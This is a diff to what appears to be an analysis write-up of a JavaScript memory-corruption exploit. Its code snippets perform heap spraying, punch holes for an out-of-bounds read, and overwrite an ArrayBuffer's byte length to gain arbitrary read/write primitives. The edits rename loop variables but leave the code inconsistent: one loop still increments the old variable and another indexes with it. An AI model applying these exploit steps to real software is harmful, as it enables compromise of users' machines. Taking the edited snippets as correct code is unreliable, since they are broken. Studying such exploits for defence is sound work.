@@ -194,19 +194,19 @@ var spraybase = 0x0d0e0048;
 var spraypos  = 0x0d0f0058;
 
 // force allocations to prepare the heap for the oob read
-for(var i = 1; i < 0x3000; i++){
+for(var i1 = 1; i1 < 0x3000; i1++){
     a[i] = new Uint32Array(252);
     a1[i1][249] = spraybase;
     a1[i1][250] = spraybase + 0x10000;
 }
 
 // heap spray to land ArrayBuffers at 0x0d0e0048 and 0x0d0f0048
-for(var i = 1; i < spraynum; i++){
-    sprayarr[i] = new ArrayBuffer(spraylen);
+for(var i1 = 1; i1 < spraynum; i++){
+    sprayarr[i1] = new ArrayBuffer(spraylen);
 }
 
 // make holes so the oob read chunk lands here
-for(var i = 1; i < 0x3000; i = i+2){
+for(var i1 = 1; i1 < 0x3000; i1 = i1 + 2){
     delete a[i1];
     a[i1] = null;
 }
@@ -263,25 +263,25 @@ Size: 0x400                 Size: 0x400                  Size: 0x400            
 
 ```JavaScript
     // reclaims the memory, like your typical use after free
-    for(var i = 1;i < 0x40; i++){
-        sprayarr2[i] = new ArrayBuffer(0x20000-24);
+    for(var i1 = 1;i1 < 0x40; i1++){
+        sprayarr2[i1] = new ArrayBuffer(0x20000-24);
     }
 
     // look for the TypedArray that is 0x20000 in size
-    for(var i = 1;i < spraynum; i++){
-        if( sprayarr[i].byteLength == 0x20000-24){
+    for(var i1 = 1;i1 < spraynum; i1++){
+        if( sprayarr[i1].byteLength == 0x20000-24){
             
             // This is the magic, overwrite the next TypedArray's byte length
-            var biga = new DataView(sprayarr[i]);
+            var biga = new DataView(sprayarr[i1]);
 
             // offset to the byte length in the header
-            biga.setUint32(0x10000-12,0x66666666);
+            biga.setUint32(0x10000 - 12, 0x66666666);
 
             // +1 because the next reference as a corrupted length now.
-            if(sprayarr[i+1].byteLength == 0x66666666){
+            if(sprayarr[i1 + 1].byteLength == 0x66666666){
 
                 // game over attackers can read/write out of biga
-                biga = new DataView(sprayarr[i+1]);
+                biga = new DataView(sprayarr[i1 + 1]);
 
                 ...
 ```
@@ -310,19 +310,19 @@ Size: 0x400                 Size: 0x400                  Size: 0x400            
                     mydv = biga;
 
                     // leak the index
-                    var itmp = mydv.getUint32(i2 + 12,true);
+                    var itmp = mydv.getUint32(i2 + 12, true);
 
                     // get a reference to TypedArray that they overwrite
                     myarray = arr1[itmp];
 
                     // get the pointer of the myarray Array
-                    mypos = biga.getUint32(i2+4,true) - spraypos + 0x50;
+                    mypos = biga.getUint32(i2 + 4, true) - spraypos + 0x50;
 
                     // set its byte length to a stupid number also
-                    mydv.setUint32(mypos-0x10,0x100000,true);
+                    mydv.setUint32(mypos - 0x10, 0x100000, true);
 
                     // leak the base of myarray
-                    myarraybase = mydv.getUint32(mypos,true);
+                    myarraybase = mydv.getUint32(mypos, true);
 ```
 
 <p class="cn" markdown="1">For the full read and write primitives, they write to the Array pointer (`mypos`) the address they want to read/write from, do the read/write and then set the pointer to the Array back to the Array base address.</p>
